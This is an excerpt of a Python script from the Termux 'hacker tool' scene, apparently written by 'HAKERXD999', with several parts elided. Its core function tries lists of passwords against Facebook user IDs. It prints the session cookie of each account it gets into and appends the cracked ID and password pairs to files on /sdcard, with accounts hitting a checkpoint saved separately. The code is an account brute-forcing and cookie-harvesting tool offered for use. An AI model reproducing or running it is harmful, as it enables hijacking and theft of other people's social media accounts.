# NAME : 𝐇𝐀𝐊𝐄𝐑𝐗𝐃𝟗𝟗𝟗
# GITHUB : https://github.com/SMXD-404
# FB GROUP : Siam termux WORLD 
# FB ID : 🙂
...
while attemps < 12345677901:
    ...
    if username == 'SM' and password == 'SM':
        ...
        attemps += 1
        continue
os.system('xdg-https://facebook.com/groups/977335149900525/')
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
╔══════════════════════════════════════════════════╗
║ ███████╗██╗ █████╗ ███╗   ███╗
...
os.system('clear')
print(logo)
os.system('espeak -a 600 " Your,   Short,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 600 " Welcome,   to,  Haker,  King,  Tools"')
pass
loop = 0
oks = []
cps = []
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK 𝐇𝐀𝐊𝐄𝐑𝐗𝐃-OK.txt')
    print(' [😁] CP 𝐇𝐀𝐊𝐄𝐑𝐗𝐃-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[𝐇𝐀𝐊𝐄𝐑𝐗𝐃-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32m𝐇𝐀𝐊𝐄𝐑𝐗𝐃-hello-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
                open('/sdcard/hello-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mlal-𝐇𝐀𝐊𝐄𝐑𝐗𝐃-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/𝐇𝐀𝐊𝐄𝐑𝐗𝐃-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
